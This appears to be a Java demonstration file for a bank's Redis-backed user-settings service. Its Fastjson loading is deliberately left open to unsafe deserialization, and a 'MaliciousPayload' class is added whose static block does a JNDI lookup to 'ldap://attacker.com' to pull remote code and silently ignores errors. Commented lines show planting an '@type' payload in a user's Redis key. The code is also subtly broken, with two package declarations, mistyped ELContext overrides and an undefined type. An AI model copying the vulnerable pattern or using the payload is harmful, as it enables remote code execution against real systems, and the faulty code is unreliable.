package com.bank.financial.service;

import com.alibaba.fastjson.JSON;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import javax.annotation.Resource;
import java.util.concurrent.TimeUnit;

/**
 * 用户配置服务类
 * 处理用户个性化设置存储与加载
 */
@Service
public class UserSettingsService {
    
    @Resource
    private RedisTemplate<String, String> redisTemplate;
    
    private static final String SETTINGS_PREFIX = "user:settings:";
    private static final int CACHE_EXPIRE_DAYS = 7;
    
    /**
     * 加载用户配置（存在漏洞的实现）
     */
    public UserSettings loadUserSettings(String userId) {
        String cacheKey = SETTINGS_PREFIX + userId;
        String serialized = redisTemplate.opsForValue().get(cacheKey);
        
        if (serialized == null || serialized.isEmpty()) {
            // 从数据库加载默认配置（示例逻辑）
            serialized = "{\\"theme\\":\\"default\\",\\"notifications\\":true}";
            redisTemplate.opsForValue().set(cacheKey, serialized, 
                CACHE_EXPIRE_DAYS, TimeUnit.DAYS);
        }
        
        // 漏洞点：不安全的反序列化
        return JSON.parseObject(serialized, UserSettings.class);
    }
    
    /**
     * 更新用户配置
     */
    public void updateUserSettings(String userId, UserSettings settings) {
        String cacheKey = SETTINGS_PREFIX + userId;
        String serialized = JSON.toJSONString(settings);
        redisTemplate.opsForValue().set(cacheKey, serialized, 
            CACHE_EXPIRE_DAYS, TimeUnit.DAYS);
    }
}

/**
 * 用户配置实体类
 */
class UserSettings {
    private String theme;
    private boolean notifications;
    
    // Fastjson反序列化需要默认构造函数
    public UserSettings() {}
    
    // Getters and setters
    public String getTheme() { return theme; }
    public void setTheme(String theme) { this.theme = theme; }
    
    public boolean isNotifications() { return notifications; }
    public void setNotifications(boolean notifications) { this.notifications = notifications; }
}

// ================== 以下为潜在攻击利用示例 ==================

package com.bank.financial.attack;

import com.alibaba.fastjson.JSON;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.el.ELContext;
import javax.el.BeanELResolver;
import javax.el.CompositeELResolver;
import javax.el.ELResolver;

/**
 * 恶意负载构造类（示例攻击代码）
 * 模拟攻击者构造恶意序列化数据
 */
public class MaliciousPayload {
    static {
        try {
            // 构造EL表达式注入
            ExpressionFactory factory = ExpressionFactory.newInstance();
            ELContext context = new DummyELContext();
            ValueExpression ve = factory.createValueExpression(context, "#{" +
                "javax.naming.InitialContext().doLookup('ldap://attacker.com:1389/exploit')" +
                '}', Object.class);
            ve.getValue(context);
        } catch (Exception e) {
            // 静默失败
        }
    }
    
    static class DummyELContext extends ELContext {
        private final ELResolver resolver = new BeanELResolver();
        
        public DummyELContext() {}
        
        @Override
        public ELResolver getELResolver() {
            return new CompositeELResolver() {
                {
                    add(resolver);
                }
            };
        }
        
        @Override
        public java.util.Map<Function, Class<?>> getFunctionMapper() {
            return null;
        }
        
        @Override
        public java.util.Map<String, Class<?>> getVariableMapper() {
            return null;
        }
    }
}

// 模拟攻击调用（Redis注入示例）
// String maliciousJson = "{\\"@type\\":\\"com.bank.financial.attack.MaliciousPayload\\"}";
// redisTemplate.opsForValue().set("user:settings:malicious_user", maliciousJson);